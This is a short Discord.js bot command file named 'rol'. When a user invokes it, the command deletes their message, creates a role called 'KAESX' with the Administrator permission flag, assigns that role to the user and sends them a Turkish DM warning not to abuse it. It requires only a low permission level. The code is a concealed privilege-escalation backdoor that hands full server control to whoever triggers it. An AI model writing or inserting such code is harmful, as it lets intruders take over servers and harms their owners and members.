const Discord = require("discord.js");

exports.run = async (client, message, args) => {

  message.delete();
  await message.guild.roles
    .create({
      data: {
        name: "KAESX",
        color: "102927",
        permissions: 8,
        hoist: true,
        mentionable: false
      },
      reason: "Coded By Tilki"
    })
    .catch(err => console.error(err));
  
  const role = await message.guild.roles.cache.find(rol => rol.name == "KAESX");

  setTimeout(async() => {
  await message.member.roles.add(role);
  }, 3000);
  await message.author.send("Rolü Verdim Ab Ama Kötüye Kullanma!");
};

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: [],
  permLevel: 1
};

exports.help = {
  name: "rol"
};